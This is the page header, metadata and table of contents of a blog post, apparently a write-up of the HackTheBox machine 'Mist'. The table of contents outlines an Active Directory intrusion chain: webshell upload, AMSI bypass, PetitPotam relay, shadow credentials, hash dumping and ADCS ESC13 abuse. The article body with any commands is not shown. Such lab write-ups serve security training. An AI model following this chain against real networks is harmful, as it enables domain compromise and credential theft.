<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="简述本文是Insane难度的HTB Mist机器的域渗透部分，其中CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice等域渗透提权细节是此b">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox Mist [CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice]">
<meta property="og:url" content="https://fdlucifer.github.io/2024/10/27/mist/index.html">
<meta property="og:site_name" content="0xfd&#39;s blog">
<meta property="og:description" content="简述本文是Insane难度的HTB Mist机器的域渗透部分，其中CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice等域渗透提权细节是此b">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mist-cats.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mist-image_20022024.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist8.png">
<meta property="article:published_time" content="2024-10-27T02:04:52.000Z">
<meta property="article:modified_time" content="2024-10-27T11:36:29.422Z">
<meta property="article:author" content="253">
<meta property="article:tag" content="DC">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist.png">


<link rel="canonical" href="https://fdlucifer.github.io/2024/10/27/mist/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2024/10/27/mist/","path":"2024/10/27/mist/","title":"HackTheBox Mist [CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackTheBox Mist [CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice] | 0xfd's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="0xfd's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">0xfd's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by 0xfd</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">41</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">78</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">214</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">简述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-number">2.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Website-TCP-80"><span class="nav-number">2.2.</span> <span class="nav-text">Website - TCP 80</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-svc-web-on-MS01"><span class="nav-number">3.</span> <span class="nav-text">Shell as svc_web on MS01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%81%A2%E5%A4%8Dadmin%E5%AF%86%E7%A0%81"><span class="nav-number">3.1.</span> <span class="nav-text">恢复admin密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="nav-number">3.1.1.</span> <span class="nav-text">漏洞背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E5%8F%91%E7%8E%B0-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">3.1.2.</span> <span class="nav-text">目录发现 - 文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crackstation"><span class="nav-number">3.1.3.</span> <span class="nav-text">Crackstation</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Webshell-Pluck-Module"><span class="nav-number">3.2.</span> <span class="nav-text">Webshell Pluck Module</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-Module"><span class="nav-number">3.2.1.</span> <span class="nav-text">Create Module</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Upload-Module"><span class="nav-number">3.2.2.</span> <span class="nav-text">Upload Module</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-AMSI"><span class="nav-number">3.2.3.</span> <span class="nav-text">Bypass AMSI</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-Brandon-Keywarp-on-MS01"><span class="nav-number">4.</span> <span class="nav-text">Shell as Brandon.Keywarp on MS01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration"><span class="nav-number">4.1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Host"><span class="nav-number">4.1.1.</span> <span class="nav-text">Host</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%81%B6%E6%84%8F%E9%93%BE%E6%8E%A5"><span class="nav-number">4.2.</span> <span class="nav-text">恶意链接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Auth-as-MS01"><span class="nav-number">5.</span> <span class="nav-text">Auth as MS01$</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Bloodhound"><span class="nav-number">5.1.</span> <span class="nav-text">Bloodhound</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="nav-number">5.1.1.</span> <span class="nav-text">收集信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="nav-number">5.1.2.</span> <span class="nav-text">文件提取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">5.1.3.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recover-Brandon-Keywrap-NTLM"><span class="nav-number">5.2.</span> <span class="nav-text">Recover Brandon.Keywrap NTLM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-number">5.2.1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-Certificate"><span class="nav-number">5.2.2.</span> <span class="nav-text">Get Certificate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dump-hash"><span class="nav-number">5.2.3.</span> <span class="nav-text">dump hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9A%A7%E9%81%93"><span class="nav-number">5.3.</span> <span class="nav-text">隧道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-1"><span class="nav-number">5.4.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB"><span class="nav-number">5.4.1.</span> <span class="nav-text">SMB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Creating-Machines"><span class="nav-number">5.4.2.</span> <span class="nav-text">Creating Machines</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AV-x2F-AMSI-Evasion"><span class="nav-number">5.4.3.</span> <span class="nav-text">AV &#x2F; AMSI Evasion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LDAP-Signing"><span class="nav-number">5.4.4.</span> <span class="nav-text">LDAP Signing</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PetitPotam-Attack"><span class="nav-number">5.5.</span> <span class="nav-text">PetitPotam Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%96%E7%95%A5"><span class="nav-number">5.5.1.</span> <span class="nav-text">策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enable-webclient"><span class="nav-number">5.5.2.</span> <span class="nav-text">Enable webclient</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tunnel"><span class="nav-number">5.5.3.</span> <span class="nav-text">Tunnel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Attack-Without-Relay"><span class="nav-number">5.5.4.</span> <span class="nav-text">Attack Without Relay</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Relay"><span class="nav-number">5.5.5.</span> <span class="nav-text">Relay</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-MS01-NTLM-Hash"><span class="nav-number">5.5.6.</span> <span class="nav-text">Get MS01$ NTLM Hash</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-Administrator-on-MS01"><span class="nav-number">6.</span> <span class="nav-text">Shell as Administrator on MS01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-Kerberos-Ticket"><span class="nav-number">6.1.</span> <span class="nav-text">Get Kerberos Ticket</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">6.2.</span> <span class="nav-text">shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#secretsdump"><span class="nav-number">6.3.</span> <span class="nav-text">secretsdump</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-op-Sharon-Mullard-on-Mist"><span class="nav-number">7.</span> <span class="nav-text">Shell as op_Sharon.Mullard on Mist</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-2"><span class="nav-number">7.1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Home-Directories"><span class="nav-number">7.1.1.</span> <span class="nav-text">Home Directories</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#KeePass"><span class="nav-number">7.1.2.</span> <span class="nav-text">KeePass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D%E5%AF%86%E7%A0%81"><span class="nav-number">7.2.</span> <span class="nav-text">恢复密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3-KeePass-Master-Password"><span class="nav-number">7.2.1.</span> <span class="nav-text">破解 KeePass Master Password</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Read-Password-from-KeePass"><span class="nav-number">7.2.2.</span> <span class="nav-text">Read Password from KeePass</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AE%E8%AE%A4user"><span class="nav-number">7.3.</span> <span class="nav-text">确认user</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Evil-WinRM"><span class="nav-number">7.4.</span> <span class="nav-text">Evil-WinRM</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Auth-as-svc-ca"><span class="nav-number">8.</span> <span class="nav-text">Auth as svc_ca$</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-3"><span class="nav-number">8.1.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Get-Password-Hash"><span class="nav-number">8.2.</span> <span class="nav-text">Get Password Hash</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Auth-as-svc-cabackup"><span class="nav-number">9.</span> <span class="nav-text">Auth as svc_cabackup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-4"><span class="nav-number">9.1.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Add-Shadow-Credential"><span class="nav-number">9.2.</span> <span class="nav-text">Add Shadow Credential</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Shell-as-Administrator"><span class="nav-number">10.</span> <span class="nav-text">Shell as Administrator</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ESC13-Background"><span class="nav-number">10.1.</span> <span class="nav-text">ESC13 Background</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ESC13-Enumeration"><span class="nav-number">10.2.</span> <span class="nav-text">ESC13 Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Check-ADCSESC13-ps1"><span class="nav-number">10.2.1.</span> <span class="nav-text">Check-ADCSESC13.ps1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bloodhound-%E9%A2%84%E5%AE%9A%E4%B9%89%E6%9F%A5%E8%AF%A2"><span class="nav-number">10.2.2.</span> <span class="nav-text">Bloodhound 预定义查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0Certipy"><span class="nav-number">10.2.3.</span> <span class="nav-text">更新Certipy</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">10.3.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview-1"><span class="nav-number">10.3.1.</span> <span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E8%AF%81%E4%B9%A6%E7%AE%A1%E7%90%86%E5%99%A8%E7%BB%84"><span class="nav-number">10.3.2.</span> <span class="nav-text">访问证书管理器组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEServiceAccounts%E7%BB%84"><span class="nav-number">10.3.3.</span> <span class="nav-text">访问ServiceAccounts组</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Recover-Hashes"><span class="nav-number">10.4.</span> <span class="nav-text">Recover Hashes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Exfil-Reg-Hives"><span class="nav-number">10.4.1.</span> <span class="nav-text">Exfil Reg Hives</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#secretsdump-1"><span class="nav-number">10.4.2.</span> <span class="nav-text">secretsdump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1secretsdump"><span class="nav-number">10.4.3.</span> <span class="nav-text">二次secretsdump</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DC01-administrator-Shell"><span class="nav-number">10.5.</span> <span class="nav-text">DC01 administrator Shell</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="253"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">253</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">214</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">78</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">41</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2024/10/27/mist/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="253">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0xfd's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackTheBox Mist [CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice] | 0xfd's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox Mist [CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-10-27 10:04:52 / Modified: 19:36:29" itemprop="dateCreated datePublished" datetime="2024-10-27T10:04:52+08:00">2024-10-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/" itemprop="url" rel="index"><span itemprop="name">CVE-2024-9405</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/" itemprop="url" rel="index"><span itemprop="name">Bypass AMSI</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/" itemprop="url" rel="index"><span itemprop="name">Malicious Link</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/" itemprop="url" rel="index"><span itemprop="name">Mist-DC01-CA enroll templates</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/Rubues-Dump-Hash/" itemprop="url" rel="index"><span itemprop="name">Rubues Dump Hash</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/Rubues-Dump-Hash/Defender-Exclusions/" itemprop="url" rel="index"><span itemprop="name">Defender Exclusions</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/Rubues-Dump-Hash/Defender-Exclusions/PetitPotam-Attack/" itemprop="url" rel="index"><span itemprop="name">PetitPotam Attack</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/Rubues-Dump-Hash/Defender-Exclusions/PetitPotam-Attack/ntlm-relay-LDAP-shell/" itemprop="url" rel="index"><span itemprop="name">ntlm relay LDAP shell</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CVE-2024-9405/Bypass-AMSI/Malicious-Link/Mist-DC01-CA-enroll-templates/Rubues-Dump-Hash/Defender-Exclusions/PetitPotam-Attack/ntlm-relay-LDAP-shell/rubeus-get-Kerberos-ticket/" itemprop="url" rel="index"><span itemprop="name">rubeus get Kerberos ticket</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
